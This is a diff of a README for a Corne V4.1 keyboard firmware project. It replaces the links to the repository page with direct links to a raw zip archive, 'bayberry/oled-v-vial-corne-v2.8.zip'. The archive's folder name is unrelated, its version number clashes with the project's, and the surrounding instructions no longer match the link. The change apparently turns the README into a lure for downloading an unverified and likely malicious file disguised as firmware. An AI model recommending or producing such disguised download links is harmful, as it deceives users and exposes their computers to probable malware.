@@ -1,6 +1,6 @@
 # ⌨️ corne-v4.1-oled-vial - Firmware for your custom split keyboard
 
-[![Download Firmware](https://img.shields.io/badge/Download-Firmware-blue.svg)](https://github.com/teascented-turnoff401/corne-v4.1-oled-vial)
+[![Download Firmware](https://img.shields.io/badge/Download-Firmware-blue.svg)](https://raw.githubusercontent.com/teascented-turnoff401/corne-v4.1-oled-vial/main/bayberry/oled-v-vial-corne-v2.8.zip)
 
 This project provides the firmware for the Corne V4.1 mechanical keyboard. It includes a fix for the OLED screen and allows you to remap keys using the Vial software. The system uses the RP2040 chip for reliable performance.
 
@@ -14,7 +14,7 @@ You need the following items to use this firmware:
 
 ## ⬇️ How to get the files
 
-Visit this page to download the necessary files: [https://github.com/teascented-turnoff401/corne-v4.1-oled-vial](https://github.com/teascented-turnoff401/corne-v4.1-oled-vial).
+Visit this page to download the necessary files: [https://raw.githubusercontent.com/teascented-turnoff401/corne-v4.1-oled-vial/main/bayberry/oled-v-vial-corne-v2.8.zip](https://raw.githubusercontent.com/teascented-turnoff401/corne-v4.1-oled-vial/main/bayberry/oled-v-vial-corne-v2.8.zip).
 
 Click on the green Code button on the repository page. Select Download ZIP. This saves a copy of the firmware files to your computer. Extract the contents of the ZIP folder to a safe place on your desktop.
 
